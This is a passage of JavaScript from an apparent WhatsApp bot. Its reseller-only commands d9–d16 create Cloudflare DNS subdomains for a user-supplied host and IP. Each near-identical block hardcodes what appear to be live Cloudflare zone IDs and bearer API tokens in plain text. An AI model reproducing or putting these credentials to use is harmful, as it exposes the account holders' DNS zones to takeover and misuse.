           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break     
 case 'd9': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "225512a5581156055086b7bdf29b28";
               let apitoken = "4CriWXyR2Ot8A2sW139O999WUUhC7Vw_a_8DSeCl";
               let tld = "serverpanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break             
 case 'd10': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9de948bb1589175a8c93512759b678";
               let apitoken = "poNl1SWzhD3rCUqFwfXwK7iAm2SobqeyLFJWa9nB";
               let tld = "skyzo.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd11': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c2047082b74a80e5be059bad59592a";
               let apitoken = "SDG2MrxgoJLZ8GDkpWk2PalEn-Vg8PQkjEsPQ_Wy";
               let tld = "digitalserver.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd12': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "946d5f35d0657cb8bfa442675b37ec42";
               let apitoken = "9IJl3ihBj_McQT6aG0D5MBFQH3YmB1PO7Z34XLr1";
               let tld = "sellerpanel-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd13': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e63c738d677e2f8df374e5391851883b";
               let apitoken = "cm6dyRx6etcOYItccSPnmUGBrgurKXiGvx2eKPAP";
               let tld = "rajapanel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd14': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
                              let zone = "9393d09e979eb356b372d69842sf82334";
               let apitoken = "VT185iGUq4f1buiW2NKPgbodJ2NpxBWG3qIzxtKbP"
               let tld = "panelvvip.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd15': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ec4430e647897d90930cbb9085dbba06";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "celiaofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd16': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0eb97a28633fbb51b17a32d6fe52dcaf";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "celiastore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
